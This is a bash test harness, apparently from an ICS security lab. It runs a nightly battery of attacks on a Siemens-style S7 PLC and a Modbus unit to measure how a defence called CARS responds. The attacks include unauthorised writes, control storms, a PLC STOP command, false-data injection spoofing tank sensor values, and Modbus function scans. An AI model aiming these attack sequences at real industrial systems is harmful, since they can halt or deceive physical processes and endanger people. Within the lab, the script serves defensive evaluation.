#!/usr/bin/env bash
# night_attack_battery.sh — rotate through the attack vectors, measuring each.
# Covers: (2) all attack ways, (3) CARS behaviour, (4) per-attack MTTM,
#         (5) practical production OT attacks. One pass = one sweep of vectors.
# Usage: ROUNDS=n bash night_attack_battery.sh   (sourced env from orchestrator)
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"; source "$HERE/night_lib.sh"
mttm_header
ROUNDS="${ROUNDS:-1}"
GAP="${GAP:-4}"   # > COOLDOWN(3s) so back-to-back trials are not dedup-suppressed

# ---------------------------------------------------------------------------
# PLC-aware round (PLC_AWARE=1): built for the CPU 1212C's hard limit of 6 dynamic
# connection resources. Every attack that opens an S7 session to PLC1 consumes one of
# those 6 slots and, once isolated, leaves a dead session until the CPU reaps it - so
# we fire at most ONE PLC1 S7 attack per cycle (rotated across vectors), only when the
# tank is confirmed live, and let it reap before the next. All the attacks that do NOT
# touch PLC1's pool - Modbus to the separate unit (.20), and the API-driven tier/GUARD/
# auth probes in night_coverage.sh - keep running at full volume. This yields a rich,
# sustained overnight without ever exhausting the 6 slots and evicting Factory IO.
run_round_plcaware(){
  # (a) pool-free attacks every cycle: forbidden Modbus op + enumeration on the LOW unit
  MEAS_TGT="$MODBUS" MEAS_LEAK=0 measure_attack modbus_illegal "$IP_OP" "$NS_OP" \
    sudo ip netns exec "$NS_OP" python3 "$MBATK" --host "$MODBUS" --attack illegal --count 3; sleep "$GAP"
  MEAS_TGT="$MODBUS" MEAS_LEAK=0 measure_attack modbus_scan "$IP_OP" "$NS_OP" \
    sudo ip netns exec "$NS_OP" python3 "$MBATK" --host "$MODBUS" --attack scan; sleep "$GAP"
  # (b) at most ONE PLC1 S7 attack this cycle, and only if the tank is live (protect the 6 slots)
  if tank_frozen; then log "  PLC-aware: tank not live - skipping the PLC1 S7 attack this cycle"; return; fi
  case $(( ${CYCLE:-1} % 5 )) in
    0) measure_attack recon_connect "$IP_ATK" "$NS_ATK" sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --read --count 1 ;;
    1) measure_attack unauth_write  "$IP_ATK" "$NS_ATK" sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --val 0x08 --count 3 ;;
    2) measure_attack unauth_control "$IP_ATK" "$NS_ATK" sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --storm --secs 2 --hz 6 ;;
    3) measure_attack fdi_scada "$IP_OP" "$NS_OP" sudo ip netns exec "$NS_OP" python3 "$S7" --host "$PLC1" --dbspoof --db 7 --offset 0 --spoofval 20 --secs 2 --hz 12 ;;
    4) measure_attack fdi_high  "$IP_OP" "$NS_OP" sudo ip netns exec "$NS_OP" python3 "$S7" --host "$PLC1" --dbspoof --db 7 --offset 0 --spoofval 90 --secs 2 --hz 12 ;;
  esac
  # let the CPU reap the single dead session before the next cycle opens another
  sleep "${PLC_DRAIN:-25}"
}

# each vector: a realistic production OT attack, launched from a namespace, then measured.
run_round(){
  if [ "${PLC_AWARE:-0}" = 1 ]; then run_round_plcaware; return; fi
  # 1) reconnaissance / unauthorised connect from an unregistered host
  measure_attack recon_connect "$IP_ATK" "$NS_ATK" \
    sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --read --count 1; sleep "$GAP"
  # 2) unauthorised WRITE to the critical PLC (actuation) from the unregistered host
  measure_attack unauth_write "$IP_ATK" "$NS_ATK" \
    sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --val 0x08 --count 3; sleep "$GAP"
  # 3) unauthorised CONTROL storm (bounded, rate-limited for unattended safety) — actuator flicker
  measure_attack unauth_control "$IP_ATK" "$NS_ATK" \
    sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --storm --secs 2 --hz 6; sleep "$GAP"
  # 4) engineering PLC-STOP job (kill switch). This one actually HALTS the CPU if a frame
  #    leaks, and the tank does not auto-reconnect, so unattended we fire it only every
  #    STOP_EVERY cycles (still proves CARS blocks it) instead of ~800x a night.
  if [ $(( ${CYCLE:-1} % ${STOP_EVERY:-12} )) -eq 0 ]; then
    measure_attack unauth_stop "$IP_ATK" "$NS_ATK" \
      sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --stop; sleep "$GAP"
    tank_frozen && recover_process   # if the stop somehow landed, try to bring the CPU back
  fi
  # 5) forbidden Modbus op on the LOW asset from the COMPROMISED-BUT-ALLOWLISTED SCADA
  #    (the unregistered vantage is segmented off the Modbus unit, so this is the realistic path)
  MEAS_TGT="$MODBUS" MEAS_LEAK=0 measure_attack modbus_illegal "$IP_OP" "$NS_OP" \
    sudo ip netns exec "$NS_OP" python3 "$MBATK" --host "$MODBUS" --attack illegal --count 3; sleep "$GAP"
  # 6) false-data injection from the COMPROMISED-BUT-ALLOWLISTED supervisory host (first-packet case)
  measure_attack fdi_scada "$IP_OP" "$NS_OP" \
    sudo ip netns exec "$NS_OP" python3 "$S7" --host "$PLC1" --dbspoof --db 7 --offset 0 --spoofval 20 --secs 2 --hz 12; sleep "$GAP"
  # 7) sensor-spoof-high from the allowlisted host (reported-full deception)
  measure_attack fdi_high "$IP_OP" "$NS_OP" \
    sudo ip netns exec "$NS_OP" python3 "$S7" --host "$PLC1" --dbspoof --db 7 --offset 0 --spoofval 90 --secs 2 --hz 12; sleep "$GAP"
  # 8) Modbus function-code enumeration (scan) from the compromised SCADA vantage
  MEAS_TGT="$MODBUS" MEAS_LEAK=0 measure_attack modbus_scan "$IP_OP" "$NS_OP" \
    sudo ip netns exec "$NS_OP" python3 "$MBATK" --host "$MODBUS" --attack scan; sleep "$GAP"
}

log "attack battery: $ROUNDS round(s), 8 vectors each"
for r in $(seq 1 "$ROUNDS"); do
  log "battery round $r/$ROUNDS"
  run_round
  greencheck || { log "greencheck failed mid-battery; self-healing"; selfheal; arm; }
done
log "attack battery done"
